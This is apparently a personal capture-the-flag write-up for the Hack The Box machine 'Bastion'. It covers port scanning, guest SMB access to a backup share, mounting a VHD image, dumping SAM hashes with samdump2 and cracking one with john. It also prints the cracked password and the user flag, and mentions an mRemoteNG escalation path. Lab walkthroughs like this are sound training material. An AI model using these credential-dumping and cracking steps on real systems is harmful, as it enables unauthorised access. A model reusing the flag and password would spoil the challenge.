# Bastion

10.10.10.134

![jerry](jerry.jpg)



# Enumerate

## Scan

```
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m58s, deviation: 1h09m14s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-20T19:48:10+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-20T17:48:09
|_  start_date: 2020-06-20T17:41:15
```

## Enumerate Services

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Bastion$ smbmap -u guest -H 10.10.10.134
[+] IP: 10.10.10.134:445        Name: unknown                                           
[-] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\FTWYUHLMSZ, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Backups                                                 READ, WRITE
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
```

* Webpage on 47001 just shows 404. Running Dirbuster. Same on 5985.
* Look through the backups

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Bastion$ smbclient //10.10.10.134/Backups
Enter WORKGROUP\pat's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jun 20 13:49:30 2020
  ..                                  D        0  Sat Jun 20 13:49:30 2020
  FTWYUHLMSZ                          D        0  Sat Jun 20 13:49:30 2020
  note.txt                           AR      116  Tue Apr 16 06:10:09 2019
  SDT65CB.tmp                         A        0  Fri Feb 22 07:43:08 2019
  WindowsImageBackup                  D        0  Fri Feb 22 07:44:02 2019
```

* Too much. Just mount it. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Bastion$ sudo mount -r -t cifs //10.10.10.134/Backups backups_mount/
[sudo] password for pat: 
Password for root@//10.10.10.134/Backups:  <enter w/o input> 
```

# Access

* Found a forum post to describe how to mount the vhd
* https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Bastion/backups_mount/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd  --inspector --ro ~/Desktop/Cert_Prep/htb/Windows/Bastion/vhdMount -v
```

* Dump the SAM stuff and registry hive with samdump to get the hashes. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Bastion/vhdMount/Windows/System32/config$ samdump2 SYSTEM SAM
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

* Try to crack the hash. 

```
pat@kali:~/Desktop/Cert_Prep/htb/Windows/Bastion$ john hashes.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 256/256 AVX2 8x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
bureaulampje     (L4mpje)
1g 0:00:00:00 DONE (2020-06-20 14:11) 1.149g/s 10799Kp/s 10799Kc/s 10799KC/s burg772v..burdy1
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

* Tried to do some stuff with impacket psexec and evil-winrm to get shell. Nothing worked. Can ssh with that password.
* Get user flag. 9bfe57d5c3309db3a151772f9d86c6cd

# Escalate

* winpeas didn't find anything helpful really. 
* powerup didn't find anything. 
* Seatbelt doesn't work because of some permissions
* Can't do systeminfo because denied. 
* See mrenoteng in program files and google after searchsploit empty. Apparently can decypt passwords. Then just log in. Not gonna bother. 

